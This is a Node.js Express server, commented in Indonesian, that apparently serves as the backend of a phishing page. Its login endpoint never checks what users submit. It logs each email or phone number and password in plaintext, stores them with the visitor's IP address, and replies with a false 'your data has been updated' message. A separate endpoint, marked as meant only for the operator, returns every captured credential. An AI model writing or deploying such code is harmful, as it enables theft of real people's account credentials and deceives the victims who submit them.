const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Pastikan folder ada (meskipun di root)
const DATA_FILE = path.join(__dirname, 'data.json');

// Fungsi baca data
function readData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            return JSON.parse(raw);
        }
    } catch (err) {
        console.error('❌ Gagal baca data.json:', err.message);
    }
    return []; // default kosong
}

// Fungsi simpan data
function saveData(data) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log(`✅ Data tersimpan: ${data.length} entries`);
        return true;
    } catch (err) {
        console.error('❌ Gagal simpan data.json:', err.message);
        return false;
    }
}

// Endpoint login
app.post('/api/login', (req, res) => {
    const { emailOrPhone, password } = req.body;
    console.log(`📥 Menerima login: ${emailOrPhone} / ${password}`);

    if (!emailOrPhone || !password) {
        return res.status(400).json({ error: 'Harap isi semua field' });
    }

    const logins = readData();
    const newEntry = {
        id: logins.length + 1,
        emailOrPhone,
        password,
        ip: req.ip || req.socket.remoteAddress,
        timestamp: new Date().toISOString()
    };
    logins.push(newEntry);
    
    const saved = saveData(logins);
    if (saved) {
        res.json({ success: true, message: 'Terima kasih. Data Anda sudah diperbaharui di dalam sistem kami.' });
    } else {
        res.status(500).json({ error: 'Gagal menyimpan data ke server.' });
    }
});

// Endpoint untuk melihat semua data (hanya untuk Anda)
app.get('/api/data', (req, res) => {
    const data = readData();
    res.json(data);
});

// Halaman utama
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
    console.log(`📁 Data akan disimpan di: ${DATA_FILE}`);
});